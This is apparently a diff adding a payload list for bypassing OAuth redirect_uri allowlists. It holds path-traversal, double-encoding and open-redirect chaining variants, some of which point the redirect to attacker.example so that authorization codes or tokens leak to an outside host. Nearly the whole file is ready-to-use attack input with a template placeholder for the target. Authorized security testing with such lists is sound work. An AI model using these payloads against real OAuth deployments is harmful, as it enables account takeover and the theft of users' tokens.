@@ -1,0 +1,33 @@
+# redirect_uri allowlist bypass probes (assumes startsWith/prefix validation)
+# Replace {BASE} with the allowlisted origin/path, e.g., https://target.example/oauth-callback
+
+{BASE}/..
+{BASE}/../
+{BASE}/../post?postId=1
+{BASE}/../post/next?path=/
+{BASE}/..%2f
+{BASE}/%2e%2e/
+{BASE}/..;%2f
+{BASE}%2f..%2f
+{BASE}%2F..%2F
+
+# Mixed encoding and path confusion
+{BASE}/./../
+{BASE}/%2e/%2e%2e/
+{BASE}//../
+{BASE}/..//
+
+# Query-based pivots on the client
+{BASE}?next=/post/next?path=/
+{BASE}?url=/post/next?path=/
+{BASE}?returnUrl=/post/next?path=/
+{BASE}?redirect=/post/next?path=/
+
+# Absolute redirects (if client open redirect accepts full URLs)
+{BASE}/../redirect?url=https://attacker.example/
+{BASE}/../post/next?path=https://attacker.example/
+
+# Subtle variants (depending on normalization)
+{BASE}/..%252f
+{BASE}/%252e%252e/
+{BASE}/..%2Fpost%2Fnext%3Fpath%3Dhttps%3A%2F%2Fattacker.example%2F
